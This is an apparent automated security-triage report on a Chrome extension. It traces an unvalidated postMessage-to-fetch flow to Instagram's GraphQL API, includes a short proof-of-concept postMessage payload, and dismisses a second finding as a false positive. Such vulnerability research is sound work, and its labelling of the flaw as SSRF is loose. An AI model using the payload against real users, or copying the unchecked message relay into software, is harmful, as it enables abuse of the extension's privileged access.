# CoCo Analysis: ddchkjcjnopklkfilhefmnichckokmni

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ddchkjcjnopklkfilhefmnichckokmni/opgen_generated_files/cs_0.js
Line 467	window.addEventListener("message", function (event) {
Line 468	    if (event.data.type == "page") {
Line 469	        chrome.runtime.sendMessage({ payload: event.data.payload }, function(resp) {

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ddchkjcjnopklkfilhefmnichckokmni/opgen_generated_files/bg.js
Line 971	        fetch(url + encodeURIComponent(JSON.stringify(request.payload)))
```

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 467)
window.addEventListener("message", function (event) {
    if (event.data.type == "page") {
        chrome.runtime.sendMessage({ payload: event.data.payload }, function(resp) { // ← attacker-controlled
            window.postMessage(resp, "*")
        });
    }
}, false);

// Background script - Message handler (bg.js Line 965)
chrome.runtime.onMessage.addListener(
    function (request, sender, sendResponse) {
        console.log(request, sender.tab, sender.tab.url);

        var url = "https://www.instagram.com/graphql/query/?query_hash=bc3296d1ce80a24b1b6e40b1e72903f5&variables=";

        fetch(url + encodeURIComponent(JSON.stringify(request.payload))) // ← attacker-controlled payload in URL
            .then(result => result.json())
            .then(response => {
                console.log(response);
                sendResponse({ type: "extension", response });
            });

       return true;
    }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage / DOM event

**Attack:**

```javascript
// Attacker code on allowed domain (freeigpicker.com)
window.postMessage({
    type: "page",
    payload: {
        malicious: "injection",
        __typename: "GraphUser",
        id: "12345"
    }
}, "*");

// The extension will make a privileged cross-origin request to Instagram's API
// with attacker-controlled data in the URL parameters
```

**Impact:** Attacker can make privileged cross-origin requests to Instagram's GraphQL API with arbitrary parameters. While the base URL is hardcoded to Instagram, the attacker controls the entire query variables, potentially allowing them to query arbitrary data from Instagram's API using the extension's permissions. This is a Server-Side Request Forgery (SSRF) vulnerability where the attacker can abuse the extension's Instagram API access.

---

## Sink 2: fetch_source → window_postMessage_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ddchkjcjnopklkfilhefmnichckokmni/opgen_generated_files/bg.js
Line 265	    var responseText = 'data_from_fetch';
```

**Code:**

```javascript
// This detection references only CoCo framework mock code (Line 265)
// which is a generic fetch response placeholder: var responseText = 'data_from_fetch';
// This is NOT actual extension code.
```

**Classification:** FALSE POSITIVE

**Reason:** CoCo only detected flows in framework mock code (before the 3rd "// original" marker at line 963 in bg.js). The actual extension code does receive data from fetch and sends it back via sendResponse, but sendResponse goes to the content script, not to window.postMessage directly. The content script does use window.postMessage (line 470), but this completes the legitimate functionality of relaying Instagram API responses back to the allowed website. The response data comes from Instagram's API (trusted backend for this extension's purpose), and only websites matching the content_scripts patterns can receive this data. This is the intended functionality, not a vulnerability.
